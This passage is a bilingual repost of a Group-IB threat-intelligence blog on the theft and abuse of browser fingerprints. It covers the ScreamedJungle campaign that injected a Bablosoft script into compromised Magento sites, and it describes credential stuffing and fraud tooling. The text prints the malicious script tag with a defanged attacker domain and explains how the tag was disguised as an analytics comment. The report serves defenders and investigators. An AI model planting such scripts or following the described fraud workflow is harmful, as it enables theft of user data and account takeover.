---
title: 浏览器指纹的恶意窃取与利用
url: https://mp.weixin.qq.com/s?__biz=MzUyMDgzMDMyMg==&mid=2247484587&idx=1&sn=6d1d5282876dd30e9ae780af173f0a77&chksm=f9e528b6ce92a1a08940a92505f3895171dcd04c6fc64eec7ee0c8c16882ec7d4535b16328a2&scene=58&subscene=0#rd
source: RedTeaming
date: 2025-02-22
fetch_date: 2025-10-06T20:37:37.398043
---

# 浏览器指纹的恶意窃取与利用

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/D8s0oRfyswknfvYfjqcQTuf4gV0ZoLbwXvwwWYqugiaRnxSLaib59Y7CYlFKicpn0j5QZh3u0jwQs1iaM4v8d0ZxUw/0?wx_fmt=jpeg)

# 浏览器指纹的恶意窃取与利用

XTeam

RedTeaming

> 文章由豆包的沉浸式翻译和语雀插件生成。原文请查看:
>
> https://www.group-ib.com/blog/fingerprint-heists

# 全文总结

本文主要介绍了网络欺诈者利用浏览器指纹识别进行恶意活动的情况，包括收集方法、影响以及相关工具和技术。

## 重要亮点

* • **浏览器指纹识别的风险**：欺诈者利用浏览器指纹识别技术窃取用户唯一数字标识符，进行欺诈活动。该技术具有不可见性，受害者可能不知道指纹已被捕获或滥用，这可能导致个人帐户被锁定和企业安全系统失效。
* • **恶意活动分析**：Group-IB 威胁情报和欺诈保护专家发现自 2024 年 5 月以来，威胁行为者入侵 Magento 网站，注入恶意代码收集用户指纹。该恶意代码隐藏在 HTML 注释标签中以使其看起来合法，会收集用户的浏览器设置、插件列表等多种信息并发送到威胁行为者的私有数据库。
* • **Bablosoft 工具**：Bablosoft 开发的自动化工具常与网络犯罪活动相关，其核心产品 BrowserAutomationStudio（BAS）可用于自动化浏览器活动，结合 FingerprintSwitcher 模块可模拟合法用户行为降低被检测的可能性。BAS 套件在地下社区被广泛用于恶意活动。
* • **凭据填充攻击**：攻击者在凭据填充活动中利用 Bablosoft 和 FingerprintSwitcher 等技术，通过导入凭据列表、绘制目标网站登录流程等方式进行攻击。指纹欺骗可绕过检测，被盗的用户指纹可能导致合法用户被错误阻止。
* • **攻击流程**：包括识别目标、搜索凭据列表、利用 Browser Automation Studio 进行资源开发和账号访问、绕过欺诈保护系统以及执行欺诈和货币化等阶段。其中绕过欺诈保护系统的方法包括使用第三方 CAPTCHA 破解模块和电话验证模块，以及利用 PerfectCanvas 技术进行指纹欺骗。

# 原文沉浸式翻译

## Introduction导言

Fraudsters are continuously seeking innovative ways to exploit unsuspecting internet users. One of the latest and most concerning techniques revolves around browser fingerprinting — a method that allows cybercriminals to steal unique digital identifiers associated with user online activity.欺诈者不断寻求创新方法来利用毫无戒心的互联网用户。最新和最令人担忧的技术之一围绕着浏览器指纹识别——一种允许网络犯罪分子窃取与用户在线活动相关的唯一数字标识符的方法。

What makes browser fingerprinting particularly alarming is its invisibility. The victim might not even know that the fingerprint has been captured or misused. Fraudsters can bypass security measures, impersonate victims on trusted platforms, and commit fraudulent activities—all without triggering suspicion from security systems that rely on these fingerprints for authentication.让浏览器指纹识别特别令人担忧的是它的不可见性。受害者甚至可能不知道指纹已被捕获或滥用。欺诈者可以绕过安全措施，在受信任的平台上冒充受害者，并进行欺诈活动，所有这些都不会引起依赖这些指纹进行身份验证的安全系统的怀疑。

The implications are far-reaching, affecting individuals and organisations alike. Companies that rely on browser fingerprinting to detect fraud or prevent account takeovers may find their systems rendered ineffective. For individuals, the theft of a fingerprint can result in unexpectedly being locked out of accounts on different online services due to false positives triggered by fraud protection or security systems.其影响是深远的，对个人和组织都有影响。依靠浏览器指纹识别来检测欺诈或防止帐户接管的公司可能会发现他们的系统变得无效。对于个人来说，指纹被盗可能会导致由于欺诈保护或安全系统触发的误报而意外地被锁定在不同在线服务的帐户之外。

In this blog, we’ll delve into how browser fingerprints are collected, the methods fraudsters use to steal and exploit them, and the steps you can take to protect yourself. Whether you’re an individual user or a business looking to enhance security, this guide will provide the insights to stay one step ahead of cybercriminals.在这篇博客中，我们将深入探讨如何收集浏览器指纹、欺诈者用来窃取和利用它们的方法，以及您可以采取哪些措施来保护自己。无论您是个人用户还是希望增强安全性的企业，本指南都将提供领先于网络犯罪分子一步的见解。

## Key discoveries in the blog博客中的主要发现

* • **Advanced Fingerprinting Techniques:** Cybercriminals exploit sophisticated methods to extract unique browser characteristics without user consent.\*\*高级指纹识别技术：\*\*网络犯罪分子利用复杂的方法在未经用户同意的情况下提取独特的浏览器特征。
* • **Identified malicious campaign collecting fingerprints of unaware users:** a threat actor is compromising Magento websites to inject malicious code aimed at collecting the fingerprints of visiting users.\*\*已发现收集不知情用户指纹的恶意活动：\*\*威胁行为者正在入侵 Magento 网站，以注入旨在收集访问用户指纹的恶意代码。
* • **Risks for Individuals:** Individuals face potential account lockouts and false positives from fraud protection systems, which can disrupt access to multiple online services.\*\*个人风险：\*\*个人面临潜在的帐户锁定和欺诈保护系统的误报，这可能会中断对多种在线服务的访问。
* • **Comprehensive Insight and Protection Strategies:** The blog provides an in-depth exploration of how browser fingerprints are collected and exploited, along with practical steps for both businesses and individuals.\*\*全面的洞察和保护策略：\*\*该博客深入探讨了如何收集和利用浏览器指纹，以及适用于企业和个人的实用步骤。

### Who may find this blog interesting:谁可能会觉得这个博客有趣：

* • Cybersecurity analysts and corporate security teams网络安全分析师和企业安全团队
* • Malware analysts恶意软件分析师
* • Head of Fraud Protection防欺诈主管
* • Threat intelligence specialists威胁情报专家
* • Cyber investigators网络调查员
* • Computer Emergency Response Teams (CERT)计算机应急响应小组 （CERT）
* • Law enforcement investigators执法调查员
* • Cyber police forces网络警察部队

![](https://mmbiz.qpic.cn/sz_mmbiz_png/D8s0oRfyswknfvYfjqcQTuf4gV0ZoLbwb0uOibrDIqicYCxawic12CftevlicdwhxV0SaWa4jEZGbicA8Im1yMtiagJw/640?wx_fmt=png&from=appmsg "null")

## Fingerprinting Collection Using Compromised Magento Websites使用受感染的 Magento 网站进行指纹采集

### Campaign Analysis活动分析

In October 2024, Group-IB threat intelligence and fraud protection specialists identified a malicious campaign that had been ongoing since at least May 2024. In this campaign, a threat actor, now tracked as ScreamedJungle, injected a Bablosoft JS script into compromised Magento websites to collect fingerprints of visiting users. Analyses carried out by Group-IB analysts identified the compromise of more than 115 e-commerce websites.2024 年 10 月，Group-IB 威胁情报和欺诈保护专家发现了一个至少自 2024 年 5 月以来一直在进行的恶意活动。在这次活动中，一个现在被跟踪为 ScreamedJungle 的威胁行为者将 Bablosoft JS 脚本注入受感染的 Magento 网站，以收集访问用户的指纹。Group-IB 分析师进行的分析确定了超过 115 个电子商务网站的入侵。

Although the technique used by the threat actor to compromise Magento online stores is not known with certainty, an analysis of the compromised sites suggests that the threat actor is likely exploiting known vulnerabilities affecting vulnerable Magento versions (e.g., CVE-2024-34102 – CosmicSting, CVE-2024-20720). This assumption is supported by the fact that many of the compromised websites detected use Magento 2.3, which reached end-of-life (EOL) status and has not been supported since September 2022.尽管尚不清楚威胁行为者用来破坏 Magento 在线商店的技术，但对受感染网站的分析表明，威胁行为者可能正在利用影响易受攻击的 Magento 版本的已知漏洞（例如，CVE-2024-34102 – CosmicSting、CVE-2024-20720）。这一假设得到了以下事实的支持：检测到的许多受感染网站都使用 Magento 2.3，该 2.3 已达到生命周期终止 （EOL） 状态，自 2022 年 9 月以来一直不受支持。

Below is an example of an injected script on compromised websites:以下是受感染网站上注入的脚本示例：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/D8s0oRfyswknfvYfjqcQTuf4gV0ZoLbwSRjFw93elq6QzdR60A3MAFictetpJiblfzzfHrvX5SPMXkaltib3BicRCg/640?wx_fmt=png&from=appmsg "null")

Figure 1. Example of injected Bablosoft fingerprinting script on compromised Magento website.图 1.在受感染的 Magento 网站上注入 Bablosoft 指纹脚本的示例。

**<script type=”text/javascript” charset=”UTF-8″ src=”hxxps://busz[.]io/j9z3GfPd?pr=1&sub\_id\_2={victim\_domain}”>\*\*\*\***

As it is possible to observe from the image above, in most cases the injected script is hidden within an HTML comment tag labeled `<!– Google Finger Analytics –>` to give it a legitimate appearance. More in general, the behavior of the JS script can be summarized as follows:从上图中可以观察到，在大多数情况下，注入的脚本隐藏在标有“<！– google finger analytics –>”的 HTML 注释标签中，以使其看起来合法。更一般地说，JS 脚本的行为可以总结如下：</！–>

* • The JS script is imported from a malicious domain under the threat actor control, in the above case is hosted on hxxps://busz[.]io/j9z3GfPd?pr=1&sub\_id\_2={victim\_domain}, which redirects to hxxps://busz[.]io/clientsafe.js;JS 脚本是从威胁行为者控制下的恶意域导入的，在上述情况下托管在 hxxps://busz[.]io/j9z3GfPd？pr=1&sub\_id\_2={victim\_domain}，重定向到 hxxps://busz[.]IO/clientsafe.js;
* • If the user visiting the compromised site is using a desktop device, therefore not using any mobile user agent, the ProcessFingerprint function is executed;如果访问受感染站点的用户使用的是桌面设备，因此未使用任何移动用户代理，则执行 ProcessFingerprint 函数;
* • Once the function is executed, several parameters related to the user visiting the compromised web pages are processed and collected (e.g., browser settings, plugin list, font list, systems properties and others);执行该功能后，将处理和收集与访问受感染网页的用户相关的几个参数（例如，浏览器设置、插件列表、字体列表、系统属性等）;

### clientsafe.jsclientsafe.js

A deeper analysis of the injected clientsafe.js script revealed that it is part of the Bablosoft BrowserAutomationStudio (BAS) suite; its purpose is to collect users’ fingerprints for later use on the Bablosoft FingerprintSwitcher module.对注入的 clientsafe.js 脚...